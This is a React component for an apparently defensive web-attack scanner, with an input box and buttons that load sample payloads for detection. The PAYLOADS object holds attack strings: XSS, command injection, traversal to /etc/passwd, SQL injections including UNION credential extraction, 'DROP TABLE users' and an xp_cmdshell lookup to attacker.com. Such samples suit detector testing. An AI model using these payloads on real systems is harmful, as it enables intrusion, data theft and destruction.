import { useState, useEffect, useRef } from 'react'

const PAYLOADS = {
  xss: "<script>alert('XSS')</script>",
  cmd: "ping 8.8.8.8; ls -la /etc",
  traversal: "../../etc/passwd",
  brute: "FFFFFS FFFFF login",
  phish: "http://paypa1.com/login",
  csrf: "https://bank.com/transfer?amount=9999&to=attacker",
  buffer: "A".repeat(210),
  dns: "google.com → 1.3.3.7",
  session: "GET /dashboard?session_id=a1b2c3d4e5f6&session_id=a1b2c3d4e5f6",
  xml: "John<role>admin</role>",
  sql_classic: "' OR '1'='1",
  sql_union: "' UNION SELECT username, password FROM users--",
  sql_comment: "admin'--",
  sql_bool: "' AND 1=1--",
  sql_time: "'; WAITFOR DELAY '0:0:5'--",
  sql_error: "' AND 1=CONVERT(int,@@version)--",
  sql_stacked: "'; DROP TABLE users;--",
  sql_taut: "' OR 'x'='x",
  sql_oob: "'; EXEC xp_cmdshell('nslookup attacker.com')--",
  sql_hex: "' OR 0x61646d696e='admin'--",
  safe: "hello123",
}

const CHIPS_GENERAL = [
  { key: 'xss', label: 'XSS', color: '#ffa520', desc: 'Cross-Site Scripting' },
  { key: 'cmd', label: 'Command Inj.', color: '#ff3b5c', desc: 'OS Command Injection' },
  { key: 'traversal', label: 'Dir. Traversal', color: '#c47bff', desc: 'Path Traversal' },
  { key: 'brute', label: 'Brute Force', color: '#00d4ff', desc: 'Repeated Login Attempts' },
  { key: 'phish', label: 'Phishing', color: '#ff6eb4', desc: 'Lookalike URL' },
  { key: 'csrf', label: 'CSRF', color: '#00ffcc', desc: 'Cross-Site Request Forgery' },
  { key: 'buffer', label: 'Buffer Overflow', color: '#ff3b5c', desc: 'Memory Overflow' },
  { key: 'dns', label: 'DNS Spoofing', color: '#aaff44', desc: 'DNS Cache Poisoning' },
  { key: 'session', label: 'Session Hijack', color: '#ffa520', desc: 'Session Token Theft' },
  { key: 'xml', label: 'XML Injection', color: '#c47bff', desc: 'XML Data Injection' },
]

const CHIPS_SQL = [
  { key: 'sql_classic', label: 'Classic' },
  { key: 'sql_union', label: 'UNION' },
  { key: 'sql_comment', label: 'Comment' },
  { key: 'sql_bool', label: 'Boolean' },
  { key: 'sql_time', label: 'Time-Based' },
  { key: 'sql_error', label: 'Error-Based' },
  { key: 'sql_stacked', label: 'Stacked' },
  { key: 'sql_taut', label: 'Tautology' },
  { key: 'sql_oob', label: 'Out-of-Band' },
  { key: 'sql_hex', label: 'Hex Encode' },
]

function Chip({ label, color, desc, onClick }) {
  return (
    <button
      onClick={onClick}
      title={desc || label}
      style={{
        background: 'var(--bg3)',
        border: '1px solid var(--border)',
        borderRadius: 5,
        color: 'var(--text-muted)',
        fontSize: 'var(--text-xs)',
        padding: '6px 12px',
        cursor: 'pointer',
        transition: 'all 0.15s',
        letterSpacing: '0.05em',
        textTransform: 'uppercase',
        fontFamily: 'var(--mono)',
        fontWeight: 500,
      }}
      onMouseEnter={e => {
        const c = e.currentTarget
        c.style.borderColor = (color || '#ff3b5c') + '90'
        c.style.color = color || '#ff3b5c'
        c.style.background = (color || '#ff3b5c') + '10'
      }}
      onMouseLeave={e => {
        const c = e.currentTarget
        c.style.borderColor = 'var(--border)'
        c.style.color = 'var(--text-muted)'
        c.style.background = 'var(--bg3)'
      }}
    >
      {label}
    </button>
  )
}

export default function Scanner({ onScan, scanning }) {
  const [input, setInput] = useState('')
  const [charCount, setCharCount] = useState(0)
  const textareaRef = useRef()

  useEffect(() => {
    const handler = (e) => {
      if ((e.ctrlKey || e.metaKey) && e.key === 'Enter') onScan(input)
    }
    window.addEventListener('keydown', handler)
    return () => window.removeEventListener('keydown', handler)
  }, [input, onScan])

  const handleChange = (e) => {
    setInput(e.target.value)
    setCharCount(e.target.value.length)
  }

  const loadPayload = (key) => {
    const val = PAYLOADS[key] || ''
    setInput(val)
    setCharCount(val.length)
    textareaRef.current?.focus()
  }

  const clearInput = () => {
    setInput('')
    setCharCount(0)
    textareaRef.current?.focus()
  }

  const dangerLevel = charCount > 150 ? 'high' : charCount > 50 ? 'medium' : 'low'
  const hasSuspicious = input && (input.includes('<') || input.includes("'") || input.includes('../') || input.includes(';'))

  return (
    <div className="panel page-enter" style={{ overflow: 'hidden' }}>
      {/* Header */}
      <div style={{ padding: '0.9rem 1.4rem', borderBottom: '1px solid var(--border)', display: 'flex', alignItems: 'center', justifyContent: 'space-between', background: 'var(--bg3)' }}>
        <div style={{ display: 'flex', alignItems: 'center', gap: 8 }}>
          <span style={{ width: 8, height: 8, borderRadius: '50%', background: 'var(--accent)', boxShadow: '0 0 6px var(--accent)', display: 'inline-block' }} />
          <span style={{ fontSize: 'var(--text-sm)', letterSpacing: '0.12em', textTransform: 'uppercase', color: 'var(--text-muted)', fontFamily: 'var(--mono)', fontWeight: 600 }}>Payload Input</span>
        </div>
        <div style={{ display: 'flex', alignItems: 'center', gap: 12 }}>
          {hasSuspicious && (
            <span style={{ fontSize: 'var(--text-xs)', color: 'var(--warn)', letterSpacing: '0.06em', fontFamily: 'var(--mono)', animation: 'pulse-dot 1.5s infinite', fontWeight: 600 }}>
              ⚠ Suspicious pattern
            </span>
          )}
          <span style={{ fontSize: 'var(--text-xs)', color: 'var(--text-muted)', fontFamily: 'var(--mono)' }}>
            {charCount} chars · Ctrl+Enter
          </span>
        </div>
      </div>

      <div style={{ padding: '1.25rem', display: 'flex', flexDirection: 'column', gap: '1.1rem' }}>
        {/* Textarea */}
        <div style={{ position: 'relative' }}>
          <textarea
            ref={textareaRef}
            value={input}
            onChange={handleChange}
            placeholder="Paste a URL, SQL query, form input, or payload to analyze…"
            spellCheck={false}
            style={{
              background: 'var(--bg2)',
              border: `1px solid ${hasSuspicious ? 'rgba(255,170,32,0.25)' : 'var(--border)'}`,
              borderRadius: 'var(--r-md)',
              color: 'var(--text)',
              fontSize: 'var(--text-base)',
              padding: '1rem 1.1rem',
              paddingBottom: '2.25rem',
              resize: 'none',
              width: '100%',
              height: 130,
              lineHeight: 1.65,
              outline: 'none',
              transition: 'border-color 0.2s, box-shadow 0.2s',
              fontFamily: 'var(--mono)',
            }}
            onFocus={e => {
              e.target.style.borderColor = 'var(--border-bright)'
              e.target.style.boxShadow = '0 0 0 2px var(--accent-dim)'
            }}
            onBlur={e => {
              e.target.style.borderColor = hasSuspicious ? 'rgba(255,170,32,0.25)' : 'var(--border)'
              e.target.style.boxShadow = 'none'
            }}
          />
          {/* Clear button */}
          {input && (
            <button
              onClick={clearInput}
              style={{ position: 'absolute', bottom: 10, right: 10, background: 'var(--bg3)', border: '1px solid var(--border)', borderRadius: 5, color: 'var(--text-muted)', fontSize: 'var(--text-xs)', padding: '4px 10px', letterSpacing: '0.04em', fontFamily: 'var(--mono)' }}
            >
              clear
            </button>
          )}
        </div>

        {/* Sample payloads */}
        <div>
          <div style={{ fontSize: 'var(--text-xs)', letterSpacing: '0.12em', textTransform: 'uppercase', color: 'var(--text-muted)', marginBottom: 10, fontFamily: 'var(--mono)', display: 'flex', alignItems: 'center', gap: 8, fontWeight: 600 }}>
            <span>Attack Vectors</span>
            <span style={{ flex: 1, height: 1, background: 'var(--border)' }} />
          </div>
          <div style={{ display: 'flex', flexWrap: 'wrap', gap: 5, marginBottom: 10 }}>
            {CHIPS_GENERAL.map(c => (
              <Chip key={c.key} label={c.label} color={c.color} desc={c.desc} onClick={() => loadPayload(c.key)} />
            ))}
          </div>

          <div style={{ fontSize: 'var(--text-xs)', letterSpacing: '0.12em', textTransform: 'uppercase', color: 'var(--text-muted)', marginBottom: 10, fontFamily: 'var(--mono)', display: 'flex', alignItems: 'center', gap: 8, fontWeight: 600 }}>
            <span>SQL Injection Variants</span>
            <span style={{ flex: 1, height: 1, background: 'var(--border)' }} />
          </div>
          <div style={{ display: 'flex', flexWrap: 'wrap', gap: 5 }}>
            {CHIPS_SQL.map(c => (
              <Chip key={c.key} label={c.label} color="#ff3b5c" onClick={() => loadPayload(c.key)} />
            ))}
            <Chip label="Safe Input" color="#00e599" onClick={() => loadPayload('safe')} />
          </div>
        </div>

        {/* Scan button */}
        <button
          onClick={() => onScan(input)}
          disabled={scanning || !input.trim()}
          style={{
            background: scanning ? 'var(--accent-dim)' : !input.trim() ? 'var(--bg3)' : 'var(--accent)',
            border: `1px solid ${scanning ? 'rgba(0,212,255,0.2)' : !input.trim() ? 'var(--border)' : 'var(--accent)'}`,
            borderRadius: 'var(--r-md)',
            color: scanning ? 'var(--accent)' : !input.trim() ? 'var(--text-muted)' : '#000',
            fontSize: 'var(--text-sm)',
            fontWeight: 700,
            letterSpacing: '0.12em',
            padding: '1rem 1.5rem',
            textTransform: 'uppercase',
            transition: 'all 0.2s',
            width: '100%',
            display: 'flex',
            alignItems: 'center',
            justifyContent: 'center',
            gap: 8,
            fontFamily: 'var(--mono)',
          }}
          onMouseEnter={e => { if (!scanning && input.trim()) { e.currentTarget.style.transform = 'translateY(-1px)'; e.currentTarget.style.boxShadow = '0 4px 20px var(--accent-glow)' } }}
          onMouseLeave={e => { e.currentTarget.style.transform = 'none'; e.currentTarget.style.boxShadow = 'none' }}
        >
          {scanning ? (
            <>
              <span style={{ display: 'inline-block', animation: 'spin 0.8s linear infinite' }}>◌</span>
              Analyzing…
            </>
          ) : (
            <>⬡ Run DFA Detection</>
          )}
        </button>
      </div>
    </div>
  )
}